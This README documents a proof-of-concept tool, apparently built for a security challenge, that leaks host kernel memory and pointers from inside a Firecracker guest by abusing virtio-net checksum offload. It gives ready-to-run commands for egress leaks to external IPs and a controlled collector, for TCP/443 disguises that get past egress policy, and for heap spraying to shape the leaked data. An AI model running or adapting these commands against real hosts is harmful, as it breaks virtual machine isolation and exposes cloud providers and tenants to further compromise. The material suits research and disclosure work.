Belajar networking

The original TAP/netns reproducer remains the default mode. To carry the same
checksum metadata across a Firecracker guest's real virtio-net boundary, run as
root inside the guest:

```sh
./test -egress -iface eth0 -dst chall.itsbengsky.id
```

Egress mode resolves the IPv4 route and next-hop MAC, sends the completing
fragments before the short malicious head, and listens for an ICMP quotation.
Its default UDP carrier is valid before the deferred write and exposes a second
UDP header after the IHL mutation, making a closed destination port return the
quoted leak through ordinary UDP/NAT paths. Use `-egress-transport raw253` for
the original experimental protocol carrier. When policy only admits web-like
traffic, `-egress-transport tcp -tcp-port 443` emits SYN-shaped TCP headers both
before and after the IHL mutation. Its default source-port bytes become
NOP,END IPv4 options after mutation. Its TCP checksum is intentionally invalid;
the controlled endpoint's passive AF_PACKET receiver observes fragments before
the remote TCP stack validates it. `-dst-mac`, `-gateway`, and `-src` can be used
when automatic discovery is unavailable.

For the x86 page-fragment layout, keep the TCP carrier at its default
`-vlan-tags 2`. Host TCP parsing pulls the remaining 12 bytes of the first TCP
header into the linear head; those two tags leave two bytes of tailroom after
that pull, exposing the `frag_list` pointer at reported past-linear offset 22.
The disposable TAP lab reproduced a canonical pointer with this geometry.

`-tcp-valid-checksum` makes both the original TCP segment and the segment that
appears after the 40-byte IHL shift checksum-valid. It solves the payload length
from the IPv4 TCP pseudo-header instead of modifying a scratch payload word;
the resulting valid segment still makes the deferred host checksum store
`0x4f00` into the first IPv4 word. This is useful when conntrack or egress policy
drops the default deliberately invalid TCP checksum. The flag is egress-only
and overrides `-egress-rest`.

```sh
./test -egress -egress-transport tcp -tcp-valid-checksum \
  -tcp-port 443 -vlan-tags 2 -dst 185.2.100.241
```

Repeated egress samples are sent as one batch and share a single capture window:

```sh
./test -egress -count 100 -egress-wait-ms 10000
```

When external forwarding is unavailable, an unused address on the host-side TAP
can provide a return path. Route the crafted datagram through the TAP gateway and
add `-answer-dst-arp`; the probe answers the host's ARP request for `-dst`, then
captures host-fragmented packets returned to the guest. This mode is explicit
because it claims the destination address on that isolated link.

```sh
./test -egress -iface eth0 -dst 192.0.2.3 -gateway 192.0.2.1 \
  -answer-dst-arp -count 10 -egress-wait-ms 15000
```

To test whether the host immediately reuses a freed `skbuff_small_head` object
for the malicious short fragment, insert one or more 128-byte experimental
Ethernet frames directly before each head. Their payload is an obvious marker;
if the returned `past-linear` window contains repeated `ee` bytes, the leak is
showing controlled predecessor contents rather than unrelated allocator data:

```sh
./test -egress -iface eth0 -dst 192.0.2.3 -gateway 192.0.2.1 \
  -answer-dst-arp -egress-spray 1 -egress-spray-fill 0xee \
  -spray-delay-us 1000 -count 10 -egress-wait-ms 15000
```

The spray uses the locally administered experimental EtherType `0x88b5` and is
disabled unless `-egress-spray` is nonzero.

The prepared-TAP laboratory mode exposes the same experiment as
`-tebar 1 -tebar-fill 0xee`. Unlike the original same-sized predecessor, the
128-byte frame actually covers the 32-byte region disclosed past the short
head's logical tail. `-spray-delay-us` gives the receive backlog time to free
that predecessor before the malicious head is allocated.

`-vlan-tags` controls the number of nested VID-0 tags (default 2). On the
nonblocking TAP/page-fragment path used by Firecracker, five tags place the
raw/UDP carrier's logical IP tail two bytes before `skb_shared_info` on x86.
For TCP, the 12-byte transport-header pull shifts the equivalent useful layout
to two tags as described above. The disclosure then includes the live
`frag_list` pointer. The probe reports canonical little-endian kernel pointers
as `host-pointer-candidate` lines. The disposable Linux 6.18 lab verified tags
2 through 7; at Linux's `VLAN_MAX_DEPTH` of 8 the deferred checksum mutation
was no longer preserved.

For a controlled external endpoint, `cmd/receiver` passively records the same
mutated packets before the endpoint's IP stack handles them. It does not supply
checksum-offload metadata and therefore does not exercise this vulnerability on
the collector host:

```sh
go build -o receiver ./cmd/receiver
sudo ./receiver -iface eth0 -udp-port 9 -tcp-port 443
```

The local TAP/netns lab can also test other deferred mutations with
`-csum-offset` (any byte offset in the IPv4 header or first-fragment payload)
and `-csum-word` (the host-endian 16-bit value to write, except the unattainable
one's-complement value `0xffff`). The default `0/0x004f` remains the verified
IHL disclosure. The fragmenter subsequently replaces the total-length,
fragment-offset, and header-checksum bytes at offsets 2..3, 6..7, and 10..11;
the probe verifies any surviving byte of an overlapping unaligned write and
reports fully transient writes for kernel tracing or KASAN.
